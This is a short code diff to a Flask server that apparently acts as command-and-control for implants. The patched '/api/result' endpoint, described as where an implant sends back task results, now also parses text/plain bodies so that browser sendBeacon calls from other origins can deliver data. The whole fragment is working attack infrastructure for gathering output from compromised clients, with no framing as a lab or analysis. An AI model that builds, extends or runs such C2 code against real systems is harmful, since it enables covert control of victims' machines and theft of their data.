@@ -81,8 +81,16 @@ def get_task(agent_id):
 
 @app.route("/api/result", methods=["POST"])
 def post_result():
-    """Implant sends back task result."""
-    data = request.get_json(silent=True) or {}
+    """Implant sends back task result.
+    Accepts both application/json and text/plain (for sendBeacon cross-origin).
+    """
+    data = request.get_json(silent=True)
+    if data is None:
+        # sendBeacon with text/plain — parse body as JSON manually
+        try:
+            data = json.loads(request.get_data(as_text=True))
+        except (json.JSONDecodeError, TypeError):
+            data = {}
     agent_id = data.get("agent_id", "unknown")
 
     result_entry = {
